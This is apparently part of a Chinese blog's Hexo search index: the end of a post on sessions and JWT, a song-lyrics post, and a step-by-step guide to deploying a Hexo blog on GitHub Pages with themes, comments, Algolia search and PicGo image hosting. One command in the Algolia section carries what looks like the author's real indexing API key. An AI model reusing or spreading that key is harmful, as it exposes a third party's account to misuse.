<li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li>
<li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li>
</ul>
</li>
</ul>
<h2 id="六、JWT-原理"><a href="#六、JWT-原理" class="headerlink" title="六、JWT 原理"></a>六、JWT 原理</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JWT 原理</a></p>
<p>JSON Web Token，服务器认证之后，会生成一个 JSON对象，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户每次与服务端通信的时候都要发回这个 JSON对象，服务器就通过这个对象来认证用户身份。为防止用户篡改数据，服务器在生成这个对象时，会加上一个 <code>签名</code>。</p>
<ul>
<li><strong>JWT 组成：</strong><code>Header.Payload.Signature</code><ul>
<li><strong>Header</strong>：头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</li>
<li><strong>Payload</strong>：载荷就是存放有效信息的地方，即用来存放实际需要传递的数据—标准中注册的声明，公共的声明，私有的声明</li>
<li><strong>Signature</strong>：这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web基础篇</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web应用基本架构</tag>
        <tag>HTTP</tag>
        <tag>会话技术</tag>
      </tags>
  </entry>
  <entry>
    <title>世间美好与你环环相扣</title>
    <url>/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="世间美好与你环环相扣"><a href="#世间美好与你环环相扣" class="headerlink" title="世间美好与你环环相扣"></a>世间美好与你环环相扣</h3><p>偏偏秉烛夜游</p>
<p>午夜星辰 似奔走之友</p>
<p>爱你每个结痂伤口</p>
<p>酿成的陈年烈酒</p>
<p>入喉尚算可口</p>
<p>怎么泪水 还偶尔失守</p>
<p>邀你细看心中缺口</p>
<p>裂缝中留存 温柔</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>让樱花偷偷 吻你额头</p>
<p>让世间美好 与你环环相扣</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>当樱花开的纷纷扬扬</p>
<p>当世间美好 与你环环相扣</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>个人博客部署</title>
    <url>/2021/05/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、个人博客搭建"><a href="#一、个人博客搭建" class="headerlink" title="一、个人博客搭建"></a>一、个人博客搭建</h1><ol>
<li>用Gridea+GitHub pages或Hexo+GitHub pages用到的 <strong>Git软件</strong> 有什么用？<br>答：Git软件是一个用来上传 <code>本地文件</code> 到GitHub上的工具。用Git上传本地文件到GitHub后，GitHub的GitHub pages（静态站点托管服务）会建立一个可访问的站点并帮你管理这些文件，然后你就可以通过你在GitHub上设置的的域名来访问这个站点。</li>
</ol>
<span id="more"></span> 

<ol>
<li>Github Pages是面向用户、组织和项目开放的公共静态页面搭建托管服务，站点可以被免费托管在Github上，我们可以选择使用 Github Pages <code>默认提供的域名github.io</code> 或者 <code>自定义域名</code> 来发布站点。Github Pages 支持自动利用 、Jekyll 生成站点，也同样支持纯 HTML 文档，将你的 Hexo站点托管在 Github Pages 上是一个不错的选择。</li>
<li>利用Hexo和GithubPages/CodingPages搭建博客，实际上就是利用Hexo在本地（你的电脑上）生成一个博客站点，然后把本地博客站点内容传输到Github/Coding上进行拷贝和备份。再由Github和Coding提供的GithubPages/CodingPages服务将博客部署到网上，这样你的博客就可以作为一个独立的站点被别人浏览（正式上线）。同时你也可以在Github和Coding上管理你的博客。</li>
</ol>
<h2 id="1-1-安装-nodejs"><a href="#1-1-安装-nodejs" class="headerlink" title="1.1 安装 nodejs"></a>1.1 安装 nodejs</h2><p><a href="https://nodejs.org/en/">nodejs 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">nmp -v</span><br><span class="line">npm root -g</span><br><span class="line">创建 node_cache 和 node_global 两个文件夹</span><br><span class="line">npm config set cache &quot;D:\网安实验室\environment\nodejs\node_global&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_42881768/article/details/105028164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162164565116780357220308%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162164565116780357220308&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105028164.pc_search_result_no_baidu_js&utm_term=nodejs%E5%AE%89%E8%A3%85%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&spm=1018.2226.3001.4187">参考</a></p>
<h2 id="1-2-注册-github"><a href="#1-2-注册-github" class="headerlink" title="1.2 注册 github"></a>1.2 注册 github</h2><p><a href="https://github.com/">github 官网</a></p>
<h2 id="1-3-下载-git-for-win"><a href="#1-3-下载-git-for-win" class="headerlink" title="1.3 下载 git for win"></a>1.3 下载 git for win</h2><p><a href="https://gitforwindows.org/">git for win</a></p>
<h2 id="1-4-Git-SSH-配置"><a href="#1-4-Git-SSH-配置" class="headerlink" title="1.4 Git SSH 配置"></a>1.4 Git SSH 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 gitfoewin 安装路径下打开 git-bash.exe</span><br><span class="line">git config --global user.name &quot;yourname&quot;	#Github用户名</span><br><span class="line">git config --global user.email &quot;youremail&quot;	#Github邮箱</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查</span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令：ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/kEv5cTisgnxOKb7.png" alt="image-20210522094333395"></p>
<p>将会生成一个.ssh文件夹，找到它</p>
<p><img src="https://i.loli.net/2021/07/09/twY5uTd4rsikqxO.png" alt="image-20210709125002767"></p>
<p>将 <code>id_rsa.pub</code> 中地内容复制下来</p>
<p>然后进入你的github进行 SSH and GPG keys 配置，找到SSH keys的设置选项，点击<code>New SSH key</code>，把的<code>id_rsa.pub</code>里面的信息粘贴进去</p>
<p><img src="https://i.loli.net/2021/07/09/K7dZESr2xRfnig3.png" alt="image-20210708222730879"></p>
<p>测试是否配置成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入 ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210708224104838.png" alt="image-20210708224104838"></p>
<h2 id="1-5-HEXO-框架下载"><a href="#1-5-HEXO-框架下载" class="headerlink" title="1.5 HEXO 框架下载"></a>1.5 HEXO 框架下载</h2><p><a href="https://hexo.io/zh-cn/">HEXO 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init xi-zhiBlog		#初始化</span><br><span class="line">cd xi-zhiBlog</span><br><span class="line">npm install 安装依赖</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地运行 hexo s -p 3333</span><br><span class="line">访问 http://localhost:3333/</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line">出现默认的端口 访问即可</span><br><span class="line">出现以下 hexo 页面</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/QaIvYowUrPiAtRE.png" alt="image-20210522114800206"></p>
<h2 id="1-6-新建文章测试"><a href="#1-6-新建文章测试" class="headerlink" title="1.6 新建文章测试"></a>1.6 新建文章测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;我的first blog&quot;</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210522134430801.png" alt="image-20210522134430801"></p>
<p>编写博客文档</p>
<p><img src="https://i.loli.net/2021/05/25/LhZ2XcYntBmTvSQ.png" alt="image-20210522134637358"></p>
<p>清理 生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/XQrhPfBKYwICgGa.png" alt="image-20210522134738564"></p>
<h2 id="1-7-将博客推送到-github-上"><a href="#1-7-将博客推送到-github-上" class="headerlink" title="1.7 将博客推送到 github 上"></a>1.7 将博客推送到 github 上</h2><ul>
<li>登录已经注册好的 Github ，创建新的仓库，名称必须是 <code>username.github.io</code></li>
</ul>
<p><img src="https://i.loli.net/2021/05/25/xrcd7yE3NqS2jJA.png" alt="image-20210522135607776"></p>
<ul>
<li>安装 git 插件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<ul>
<li>修改博客配置文件</li>
</ul>
<p><img src="https://i.loli.net/2021/07/08/9MuWViSaCXwPvem.png" alt="image-20210708223352779"></p>
<ul>
<li>推送博客</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean		#清理</span><br><span class="line">hexo generate	#生成</span><br><span class="line">hexo deploy		#部署</span><br></pre></td></tr></table></figure>

<p>等待一会（或许会有些长。。。）</p>
<p>访问 <code>https://username.github.io</code> ，得到</p>
<p><img src="https://i.loli.net/2021/05/25/O4tTsbruoeUp1ni.png" alt="image-20210522140805690"></p>
<h2 id="1-8-安装-sublime"><a href="#1-8-安装-sublime" class="headerlink" title="1.8 安装 sublime"></a>1.8 安装 sublime</h2><p><a href="http://www.sublimetext.com/">sublime 官网</a></p>
<h1 id="二、主题"><a href="#二、主题" class="headerlink" title="二、主题"></a>二、主题</h1><p>示例：yilia</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/DbGhUmeiq24cHsr.png" alt="image-20210522141239219"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/eCahZqzPVnU8cd3.png" alt="image-20210522141315773"></p>
<h2 id="2-1-Fan"><a href="#2-1-Fan" class="headerlink" title="2.1 Fan"></a>2.1 Fan</h2><h3 id="2-1-1-主题下载"><a href="#2-1-1-主题下载" class="headerlink" title="2.1.1 主题下载"></a>2.1.1 主题下载</h3><p>下载主题模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/fan-lv/Fan.git themes/Fan</span><br></pre></td></tr></table></figure>

<p>更改主题配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: Fan</span><br></pre></td></tr></table></figure>

<p>安装依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210523130227198.png" alt="image-20210523130227198"></p>
<p>注意 上面修改的是 <code>themes\Fan\_config.yml</code> 路径下的，而非  根目录下的 <code>_config.yml</code> ，修改完之后也许还会有 关于 评论的 报错，因为这时我们还未配置留言评论相关的配置，所以我们将其配置为空就可以了。</p>
<p><img src="https://i.loli.net/2021/05/25/SAQZu9U4kdbNyP7.png" alt="image-20210523130502995"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://i.loli.net/2021/05/25/2zDneZU8GFLvOX1.png" alt="image-20210523130628060"></p>
<h3 id="2-1-2-创建新的博客"><a href="#2-1-2-创建新的博客" class="headerlink" title="2.1.2 创建新的博客"></a>2.1.2 创建新的博客</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;Lihux 命令&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/8tX5PpemhJxAVgS.png" alt="image-20210523130926895"></p>
<p>默认内容如下</p>
<p><img src="D:\APP\Typora\images_local\image-20210523130947872.png" alt="image-20210523130947872"></p>
<p>我们可以自己配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">author: xxx</span><br><span class="line">tags:</span><br><span class="line">  - xxx</span><br><span class="line">categories:</span><br><span class="line">  - xxx</span><br><span class="line">date: xxx</span><br><span class="line">top: 1     <span class="comment">#表示需要置顶的文章，数值越大越靠前</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-评论与留言"><a href="#2-1-3-评论与留言" class="headerlink" title="2.1.3 评论与留言"></a>2.1.3 评论与留言</h3><ul>
<li><p>在根目录下 <code>_config.yml</code> 文件中加入以下代码，<code>[&quot;gitment&quot;, &quot;valine&quot;]</code> 配置自行选择一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    owner: &#x27;Your GitHub ID&#x27;</span><br><span class="line">    repo: &#x27;The repository to store your comments. Make sure you&#x27;re repo&#x27;s owner&#x27;</span><br><span class="line">    client_id: &#x27;GitHub client ID&#x27;</span><br><span class="line">    client_secret: &#x27;GitHub client secret&#x27;</span><br><span class="line"></span><br><span class="line">  # 可以自由配置 valine 的其他配置项</span><br><span class="line">  valine:</span><br><span class="line">    appId: &#x27;Your appId&#x27;</span><br><span class="line">    appKey: &#x27;Your appKey&#x27;</span><br><span class="line">    placeholder: &#x27;xxx&#x27;</span><br><span class="line">    ...(valine配置项，参考链接 https://valine.js.org/configuration.html)</span><br></pre></td></tr></table></figure></li>
<li><p><code>themes</code> -&gt; <code>_config.yml</code> 中可以开启或关闭 <code>comments</code>，并且通过 <code>type</code> 指定使用的评论插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: &quot;valine&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-1-4-增加-algolia-搜索功能"><a href="#2-1-4-增加-algolia-搜索功能" class="headerlink" title="2.1.4 增加 algolia 搜索功能"></a>2.1.4 增加 algolia 搜索功能</h3><p>注册algolia</p>
<p><img src="https://i.loli.net/2021/05/25/UmTOPARzaIlewji.png" alt="image-20210523133449426"></p>
<p>新增api keys，重要的是在ACL里面增加删除和新增Object的权限</p>
<p><img src="https://i.loli.net/2021/05/25/gjDqCBcXLZrlQPK.png" alt="image-20210523134532193"></p>
<p>如图得到</p>
<p><img src="https://i.loli.net/2021/05/25/cKOaNX5wbYdj4nP.png" alt="image-20210523134805117"></p>
<p>安装扩展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-algolia --save</span><br></pre></td></tr></table></figure>

<p>增加根目录 <code>_config.yml</code> 配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: &#x27;你的Application ID&#x27;</span><br><span class="line">  apiKey: &#x27;你的Search-Only API Key&#x27;</span><br><span class="line">  indexName: &#x27;输入刚才创建index name&#x27;</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set HEXO_ALGOLIA_INDEXING_KEY=33ee877688fc550930bcca909f161863</span><br><span class="line"><span class="meta">#</span><span class="bash">Notes: Mac 和 git bash 为 <span class="built_in">export</span>, Windows 为 <span class="built_in">set</span>, Powershell 用 <span class="variable">$env</span></span></span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/L4PdfhJwv6RWpV7.png" alt="image-20210523150707656"></p>
<p>发现已经提交</p>
<p>然后修改主题下的配置。更改为true</p>
<p><img src="https://i.loli.net/2021/05/25/u1HONdMBwj6aJe8.png" alt="image-20210523151012461"></p>
<p>最后 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h2 id="2-2-Next"><a href="#2-2-Next" class="headerlink" title="2.2 Next"></a>2.2 Next</h2><p><strong>提供写的很好的参考博客</strong></p>
<p><a href="https://blog.csdn.net/loze/article/details/94206726">https://blog.csdn.net/loze/article/details/94206726</a></p>
<p><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p>
<p><a href="https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=">https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=</a></p>
<h2 id="2-3-Hiker"><a href="#2-3-Hiker" class="headerlink" title="2.3 Hiker"></a>2.3 Hiker</h2><p>下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iTimeTraveler/hexo-theme-hiker.git themes/hiker</span><br></pre></td></tr></table></figure>

<p>修改配置文件当中的 theme</p>
<p><img src="https://i.loli.net/2021/07/08/lMUFkL5wDvh9sRN.png" alt="image-20210708234959800"></p>
<p>更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/hiker</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p><strong>搜索功能</strong></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103338696">https://blog.csdn.net/nineya_com/article/details/103338696</a></p>
<h1 id="三、其它介绍"><a href="#三、其它介绍" class="headerlink" title="三、其它介绍"></a>三、其它介绍</h1><h2 id="3-1-创建博客"><a href="#3-1-创建博客" class="headerlink" title="3.1 创建博客"></a>3.1 创建博客</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;	<span class="comment">#博客的创建，[layout] 决定博客路径的不同</span></span><br><span class="line">hexo new paper				<span class="comment">#source/_posts</span></span><br><span class="line">hexo new page board			<span class="comment">#source，访问链接变为 https://xxx.xxx/board</span></span><br><span class="line">hexo new draft newpage		<span class="comment">#source/_drafts</span></span><br><span class="line">hexo server --draft			<span class="comment">#将 draft 在本地预览</span></span><br><span class="line">hexo publish draft newpage  <span class="comment">#将 draft 发表到 post 中</span></span><br></pre></td></tr></table></figure>

<h2 id="3-2-菜单栏"><a href="#3-2-菜单栏" class="headerlink" title="3.2 菜单栏"></a>3.2 菜单栏</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令</span></span><br><span class="line">hexo new page about</span><br><span class="line"><span class="comment">#它就会在根目录下source文件夹中新建了一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#想要自己再自定义一个菜单栏的选项</span></span><br><span class="line">hexo new page yourdiy</span><br><span class="line"><span class="comment">#然后在主题配置文件的menu菜单栏添加一个 Yourdiy : /yourdiy，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: &#x27;中文意思&#x27;就可以显示中文了。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#分类：</span></span><br><span class="line">hexo new page categories</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2021-05-24 00:03:00</span><br><span class="line"><span class="built_in">type</span>: categories</span><br><span class="line">---</span><br><span class="line"><span class="comment">#之后创建新的博客文章时在其最上面添加 categories: 名称 即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#标签：</span></span><br><span class="line">hexo new page tags</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-14 18:19:31</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">#之后创建新的博客文章时在其最上面添加 tags: -名称 即可</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-评论"><a href="#3-3-评论" class="headerlink" title="3.3 评论"></a>3.3 评论</h2><p><strong>主题配置中修改：type 类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: </span><br></pre></td></tr></table></figure>

<p><strong>gitment ：根目录配置文件中增加</strong></p>
<p><a href="https://github.com/settings/applications/new">gitment 注册页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    mint: true</span><br><span class="line">    count: true</span><br><span class="line">    lazy: true</span><br><span class="line">    cleanly: true</span><br><span class="line">    language:</span><br><span class="line">    github_user: </span><br><span class="line">    github_repo: </span><br><span class="line">    client_id: </span><br><span class="line">    client_serect: </span><br></pre></td></tr></table></figure>

<p><strong>valine：根目录配置文件中增加</strong></p>
<p><a href="https://www.leancloud.cn/">valine 注册页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  valine:</span><br><span class="line">    enable: true</span><br><span class="line">    appid: </span><br><span class="line">    appkey: </span><br><span class="line">    notify: false</span><br><span class="line">    verity: false</span><br><span class="line">    placeholder: 留下你美好的足迹叭^-^!</span><br><span class="line">    guest_info: nink,mail</span><br><span class="line">    pageSize: 10</span><br></pre></td></tr></table></figure>

<h2 id="3-4-图床"><a href="#3-4-图床" class="headerlink" title="3.4 图床"></a>3.4 图床</h2><ul>
<li><p>腾讯云注册、创建对象存储 <a href="https://blog.csdn.net/qq_40672635/article/details/105904918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162193173316780264070887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162193173316780264070887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-105904918.pc_search_result_cache&utm_term=%E8%85%BE%E8%AE%AF%E4%BA%91PICgo&spm=1018.2226.3001.4187">参考链接</a></p>
</li>
<li><p>获取密钥 <a href="https://console.cloud.tencent.com/cam/capi">地址</a></p>
</li>
<li><p>COSBrowser <a href="https://cloud.tencent.com/document/product/436/40762">官方文档</a></p>
</li>
<li><p>下载 PicGo  <a href="https://github.com/Molunerfinn/PicGo/releases">下载地址</a> </p>
</li>
<li><p>使用 <strong>腾讯云 + Typora +  PicGo</strong>  :</p>
<p>文件— 偏好设置，如下图进行配置</p>
<p><img src="https://i.loli.net/2021/05/25/Z1ArJXndGR9fsHW.png"></p>
<p>对于 PicGo ，配置如下</p>
<p><img src="https://i.loli.net/2021/05/25/CDi4mFZodyux3AJ.png" alt="image-20210525165424121"></p>
<p>最后点击上方的验证图片上传选项即可检验</p>
</li>
<li><p>第二种配置</p>
<p><img src="https://i.loli.net/2021/05/25/7VNB8QnXUtwvklP.png" alt="image-20210525171054377"></p>
<p>点击下载或更新</p>
<p>访问下面链接，注册账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>然后访问下面链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>点击生成Token</p>
<p><img src="https://i.loli.net/2021/05/25/4clAgqx5w3YDrbt.png" alt="image-20210525171309143"></p>
<p>然后点击Typora中的打开配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;picBed&quot;: &#123;</span><br><span class="line">    &quot;uploader&quot;: &quot;smms&quot;,</span><br><span class="line">    &quot;smms&quot;: &#123;</span><br><span class="line">      &quot;token&quot;: &quot;你上个页面的申请的token&quot; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgoPlugins&quot;: &#123;&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入Token，保存</p>
<p>最后 验证图片上传选项进行验证 即可</p>
</li>
</ul>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><p><a href="http://theme-next.iissnan.com/faqs.html#favicon">next 主题配置官方</a></p>
<p><a href="https://hexo.io/zh-cn/docs/configuration">hexo 官方使用文档</a></p>
<p><a href="https://www.jianshu.com/p/9d91355e8418">Github + PicGo 参考</a></p>
<p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-13">博客搭建全1</a></p>
<p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162175036716780262580342%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162175036716780262580342&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-82729029.pc_search_result_no_baidu_js&utm_term=hexo+%E5%A2%9E%E5%8A%A0+comments&spm=1018.2226.3001.4187">HEXO 博客搭建全</a></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103308963">https://blog.csdn.net/nineya_com/article/details/103308963</a></p>
<p><a href="https://github.com/iTimeTraveler/hexo-theme-hiker">hiker 主题界面设置</a></p>
<p><a href="https://www.bilibili.com/video/BV1cW411A7Jx?p=4">https://www.bilibili.com/video/BV1cW411A7Jx?p=4</a></p>
<p><a href="https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs">https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs</a></p>
]]></content>
      <categories>
        <category>博客部署</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>Hexo</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树_题</title>
    <url>/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/</url>
